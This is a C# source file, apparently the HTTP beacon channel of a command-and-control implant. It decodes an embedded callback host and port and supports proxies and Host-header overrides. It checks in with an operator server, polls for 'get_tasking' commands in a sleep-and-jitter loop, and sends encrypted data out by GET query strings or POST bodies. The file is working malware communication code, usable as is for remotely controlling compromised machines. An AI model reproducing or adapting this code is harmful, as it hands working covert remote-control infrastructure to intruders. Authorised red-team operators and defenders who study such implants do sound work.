using Agent.Interfaces;
using Agent.Models;
using System.Net;
using Agent.Utilities;

using System.Text.Json;

namespace Agent.Profiles
{
    public class HttpProfile : IProfile
    {
        public IAgentConfig agentConfig { get; set; }
        public ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private string userAgent { get; set; }
        private string hostHeader { get; set; }
        private string getURL { get; set; }
        private string postURL { get; set; }
        private string proxyHost { get; set; }
        private string proxyPass { get; set; }
        private string proxyUser { get; set; }
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private HttpClient _client { get; set; }

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;

        public HttpProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            HttpClientHandler handler = new HttpClientHandler();
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;
            var opts = JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                HttpChannelOptionsJsonContext.Default.HttpChannelOptions)
                ?? throw new InvalidOperationException("Invalid HTTP profile configuration");
            int callbackPort = opts.CallbackPort;
            string callbackHost = opts.CallbackHost;
            string getUri = opts.GetUri;
            string queryPath = opts.QueryPathName;
            string postUri = opts.PostUri;
            this.userAgent = opts.Headers.GetValueOrDefault("User-Agent", "");
            this.hostHeader = opts.Headers.GetValueOrDefault("Host", "");
            this.getURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{getUri}?{queryPath}=";
            this.postURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{postUri}";
            this.proxyHost = string.IsNullOrEmpty(opts.ProxyPort)
                ? opts.ProxyHost
                : $"{opts.ProxyHost}:{opts.ProxyPort}";
            this.proxyPass = opts.ProxyPass;
            this.proxyUser = opts.ProxyUser;



            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }

            this._client = new HttpClient(handler);

            if (!string.IsNullOrEmpty(this.hostHeader))
            {
                this._client.DefaultRequestHeaders.Host = this.hostHeader;
            }

            if (!string.IsNullOrEmpty(this.userAgent))
            {
                this._client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            foreach (var header in opts.Headers)
            {
                if (header.Key != "User-Agent" && header.Key != "Host")
                {
                    this._client.DefaultRequestHeaders.Add(header.Key, header.Value);
                }
            }
        }


        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

                if (!string.IsNullOrEmpty(res))
                {
                    try
                    {
                        CheckinResponse? response = JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
                        if (CheckinResponseValidation.IsSuccessful(response))
                        {
                            return response!;
                        }
                    }
                    catch (JsonException)
                    {
                    }
                }
                currentAttempt++;
            } while (currentAttempt <= maxAttempts);

            return new CheckinResponse()
            {
                status = "failed"
            };
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000, cancellationTokenSource.Token);
                }
                catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
                {
                    break;
                }
                try
                {
                    bool delivered = await DeliverBeaconOnce();
                    this.currentAttempt = delivered ? 0 : this.currentAttempt + 1;
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }
            }
        }

        private async Task<bool> DeliverBeaconOnce()
        {
            GetTaskingResponse? tasking = null;
            await messageManager.DeliverAsync(
                this.Send,
                response => TryParseTasking(response, out tasking));
            if (tasking is null)
            {
                return false;
            }

            this.SetTaskingReceived?.Invoke(null, new TaskingReceivedArgs(tasking));
            return true;
        }

        private static bool TryParseTasking(string response, out GetTaskingResponse? tasking)
        {
            tasking = null;
            if (string.IsNullOrEmpty(response))
            {
                return false;
            }

            try
            {
                tasking = JsonSerializer.Deserialize(response, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                if (tasking?.action != "get_tasking")
                {
                    tasking = null;
                    return false;
                }
                return true;
            }
            catch (JsonException)
            {
                return false;
            }
        }

        internal async Task<string> Send(string json)
        {
            //This will encrypted if AES is selected or just Base64 encode if None is referenced.
                json = this.crypt.Encrypt(json);

                HttpResponseMessage response;

                if (json.Length < 2000) //Max URL length
                {
                    // If there are trailing "==" (Base64 padding) at the end of the string, URL-encode them as "%3D%3D"
                    if (json.EndsWith("=="))
                    {
                        json = json.Substring(0, json.Length - 2) + "%3D%3D";
                    }
                    response = await this._client.GetAsync(this.getURL + json.Replace('+', '-').Replace('/', '_'), cancellationTokenSource.Token);
                }
                else
                {
                    response = await this._client.PostAsync(this.postURL, new StringContent(json), cancellationTokenSource.Token);
                }

                response.EnsureSuccessStatusCode();
                string strRes = await response.Content.ReadAsStringAsync();

                //This will decrypt and remove the UUID if AES is referenced, or just remove the UUID if None is referenced.
                return this.crypt.Decrypt(strRes);
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();

            return true;
        }
    }
}
